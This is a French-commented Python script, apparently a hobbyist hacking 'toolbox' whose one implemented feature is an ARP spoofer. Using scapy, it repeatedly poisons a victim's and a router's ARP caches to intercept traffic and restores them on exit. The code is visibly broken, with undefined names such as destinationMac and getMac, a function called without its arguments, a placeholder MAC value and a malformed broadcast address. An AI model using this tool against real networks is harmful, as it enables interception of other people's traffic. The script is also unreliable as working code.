# ---------------------------------------------------------

# Importation des librairies 

#---------------------------------------------------------

from socket import timeout
import scapy.all as scapy # on importe tous les modules de Scapy.
import time # on importe la librairie time permettant de mettre des pauses entre chaque envoient de paquets.
import argparse # on importe la librairie argparse permettant d'ajouter des arguments très simplement.
import sys # on importe la librairie sys pour permettre des impressions dynamiques


#---------------------------------------------------------

# Boîte à outil

#---------------------------------------------------------


print("""  _____                           __  __                      _   _           
  / ____|                         |  \/  |                    | | (_)           
 | |     __ _  ___  ___  __ _ _ __| \  / | __ ___  _____ _ __ | |_ _ _   _ ___  
 | |    / _` |/ _ \/ __|/ _` | '__| |\/| |/ _` \ \/ / _ \ '_ \| __| | | | / __| 
 | |___| (_| |  __/\__ \ (_| | |  | |  | | (_| |>  <  __/ | | | |_| | |_| \__ \ 
  \_____\__,_|\___||___/\__,_|_|  |_|  |_|\__,_/_/\_\___|_| |_|\__|_|\__,_|___/ 
                                                                                \n
                                                                                \n """)
# Création de ma fonction main étant le principal menu de ma boîte à outil
def main():
	while True : # Boucle pour revenir aux demandes au cas ou l'utilisateur n'intérargi pas avec une fonction
		n = input("1- Network Scanner\n2- ARP Spoofing\n3- Exploit\n\nEntrez un nombre : ") # Création des choix du menu
		if n == '1': # boucle qui renvoie à un print si l'utilisateur choisi 1
			print("***********************************************************************") 
			print("En cours de construction")
			print("***********************************************************************") 
		elif n == '2': # boucle qui va renvoyer l'utilisateur à la fonction si il choisit 2
			arpspoof()
		elif n == '3':# boucle qui renvoie à un print si l'utilisateur choisi 3
			print("***********************************************************************") 
			print("En cours de construction")
			print("***********************************************************************") 
            
		else: # boucle qui renvoie à un print si l'utilisateur choisi un nombre inexistant du menu
			print("***********************************************************************") 
			print("Cette option est inexistante")
			print("***********************************************************************") 


# Fonction principale permettant de faire fonctionner tout le programme
def arpspoof():    
    # Message de bienvenue
	print("***********************************************************************")  
	print("**********Bienvenue sur le ARP Spoofer de CaesarMaxentius**********")
	print("***********************************************************************")   
    # Définition de mes fonctions dynamiques permettant à l'utilisateur d'entrer lui-même ses charactères
	targetIP = input("Entrez l'adresse IP de la victime : ") # On défini la fonction targetIP qui sera l'IP de la victime
	spoofIP = input("Entrez l'adresse IP que vous voulez usurper : ") # On défini la fonction spoofIP qui sera l'IP que nous voudrons usurper.
	routeurIP = input("Entrez l'adresse IP du routeur : ")
	interface = input("Entrez votre interface ethernet : ")
# -----------------
	    # RECHERCHER LA MAC
	def recherche_mac(targetIP, interface):
	    pkt7 = Ether(dst="ff:ff:ff:ff:ff") / ARP(pdst=targetIP) 
	    ans = srp1(pkt7, iface=interface, timeout=2)
	    
	    if ans:
	        mac = ans[0][1].hwsrc
	        return str(mac)
	    else:
	        print("L'adresse MAC est inexistante")
	
	recherche_mac()
# -----------------

	destinationIP = targetIP # Cela reprend notre précédente fonction (IP de la victime)
	sourceIP = input("Entrez votre adresse IP (pour reset lorsque vous aurez terminé) : ") # Pour s'assurer de revenir à l'état normal, nous renverrons des paquets ARP correctes.

# -----------------
    # A MODIFIER
	sourceMAC = 'x'
# -----------------

# Message de lancement

# -----------------

	print(
	"##::::::::::'###::::'##::: ##::'######::'########:'##::::'##:'########:'##::: ##:'########::::\n"
	"##:::::::::'## ##::: ###:: ##:'##... ##: ##.....:: ###::'###: ##.....:: ###:: ##:... ##..:::::\n"
	"##::::::::'##:. ##:: ####: ##: ##:::..:: ##::::::: ####'####: ##::::::: ####: ##:::: ##:::::::\n"
	"##:::::::'##:::. ##: ## ## ##: ##::::::: ######::: ## ### ##: ######::: ## ## ##:::: ##:::::::\n"
	"##::::::: #########: ##. ####: ##::::::: ##...:::: ##. #: ##: ##...:::: ##. ####:::: ##:::::::\n"
	"##::::::: ##.... ##: ##:. ###: ##::: ##: ##::::::: ##:.:: ##: ##::::::: ##:. ###:::: ##:::::::\n"
	"########: ##:::: ##: ##::. ##:. ######:: ########: ##:::: ##: ########: ##::. ##:::: ##:::::::\n"
	"........::..:::::..::..::::..:::......:::........::..:::::..::........::..::::..:::::..:::::::\n"
	)



	def spoofer(targetIP, spoofIP):
		packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
		scapy.send(packet, verbose=False)

	def restore(destinationIP, sourceIP):
		packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=getMac(destinationIP),psrc=sourceIP,hwsrc=sourceMAC)
		scapy.send(packet, count=4,verbose=False)


	packets = 0
	try:
		while True:
			spoofer(targetIP,routeurIP)
			spoofer(routeurIP,targetIP)
			print("\rCaesar HACKING : [+] Envoie de paquets "+ str(packets)),
			sys.stdout.flush()
			packets +=2
			time.sleep(2)
	except KeyboardInterrupt:
		print("***********************************************************************")  
		print("\nInterrompre le Spoof en faisant CTRL + C------------ Retour à l'état normal..")
		print("***********************************************************************") 
		print( 
"\n   _____    ___.   .__               __          __   "
"\n  /  _  \   \_ |__ |__| ____   _____/  |_  _____/  |_ "
"\n /  /_\  \   | __ \|  |/ __ \ /    \   __\/  _ \   __\""
"\n/    |    \  | \_\ \  \  ___/|   |  \  | (  <_> )  |  "
"\n\____|__  /  |___  /__|\___  >___|  /__|  \____/|__|  "
"\n        \/       \/        \/     \/                  "
)
		print("***********************************************************************") 
		restore(targetIP,routeurIP)
		restore(routeurIP,targetIP)
        
        
if __name__ == "__main__":
	main()        
        
        






#-----------------------------------------------------------------------------
#------------------------------ PARTIE CODE ----------------------------------
#-----------------------------------------------------------------------------
